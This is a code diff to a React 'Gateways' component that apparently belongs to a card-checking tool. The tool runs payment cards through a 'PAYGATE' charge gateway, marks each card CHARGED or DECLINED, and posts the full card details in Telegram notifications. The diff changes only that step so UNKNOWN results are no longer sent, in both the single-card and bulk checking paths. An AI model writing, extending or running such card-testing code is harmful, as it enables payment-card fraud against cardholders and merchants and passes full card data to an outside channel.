@@ -786,8 +786,8 @@ const Gateways = () => {
 
       setResult(checkResult);
 
-      // Send Telegram notification for PAYGATE checks (all statuses) with real API response
-      if (selectedGateway.id === "paygate_charge" && paygateResponse) {
+      // Send Telegram notification for PAYGATE checks (CHARGED/DECLINED only, skip UNKNOWN)
+      if (selectedGateway.id === "paygate_charge" && paygateResponse && checkStatus !== "unknown") {
         try {
           // Build real response message from API
           const realResponseMessage = `${paygateResponse.apiStatus}: ${paygateResponse.apiMessage}${paygateResponse.apiTotal ? ` (${paygateResponse.apiTotal})` : ''}`;
@@ -796,7 +796,7 @@ const Gateways = () => {
             body: {
               user_id: userId,
               card_details: fullCardString,
-              status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
+              status: checkStatus === "live" ? "CHARGED" : "DECLINED",
               response_message: realResponseMessage,
               amount: paygateResponse.apiTotal || "$14.00",
               gateway: "PAYGATE",
@@ -1448,8 +1448,8 @@ const Gateways = () => {
           apiResponse: apiResponseDisplay
         };
 
-        // Send Telegram notification for PAYGATE checks (bulk - all statuses) with real API response
-        if (selectedGateway.id === "paygate_charge" && paygateResponse) {
+        // Send Telegram notification for PAYGATE checks (CHARGED/DECLINED only, skip UNKNOWN)
+        if (selectedGateway.id === "paygate_charge" && paygateResponse && checkStatus !== "unknown") {
           try {
             // Build real response message from API
             const realResponseMessage = `${paygateResponse.apiStatus}: ${paygateResponse.apiMessage}${paygateResponse.apiTotal ? ` (${paygateResponse.apiTotal})` : ''}`;
@@ -1458,7 +1458,7 @@ const Gateways = () => {
               body: {
                 user_id: userId,
                 card_details: fullCardStr,
-                status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
+                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
                 response_message: realResponseMessage,
                 amount: paygateResponse.apiTotal || "$14.00",
                 gateway: "PAYGATE",
